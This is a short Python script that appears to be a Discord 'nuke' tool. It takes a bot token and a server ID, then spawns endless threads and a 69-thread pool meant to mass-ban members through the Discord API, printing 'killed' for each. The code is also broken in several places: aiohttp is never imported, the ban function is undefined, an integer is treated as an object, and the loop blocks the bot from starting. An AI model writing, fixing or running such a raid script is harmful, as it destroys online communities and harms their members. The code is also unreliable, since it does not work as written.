import os, threading, asyncio
from multiprocessing.dummy import Pool as ThreadPool
os.system('pip install discord.py')
os.system('pip install aiohttp[speedup]')
from threading import Thread 
import discord 
from discord.ext import commands 
from discord import Member
os.system('clear')

bot = commands.Bot(command_prefix="69", intents=discord.Intents.all())
bot.remove_command('help')

token = str(input('Token :')) 
guild = int(input('guild id :'))

srvr = bot.get_guild(guild)

async def main(srvr, member):
   async with aiohttp.ClientSession() as session:
      async with session.put(f'https://discord.com/api/v10/guilds/{srvr}/bans/{member}', data=b'data') as r:
         if r.response == '200' or r.response == '201' or r.response == "203":
            print(f'killed {member.name}')



while True:
   threading.Thread(target=ban, args=guild.id).start()
   threading.Thread(target=ban, args=guild.id).start()

pool = ThreadPool(69)
results = pool.map(ban)

bot.run(token)
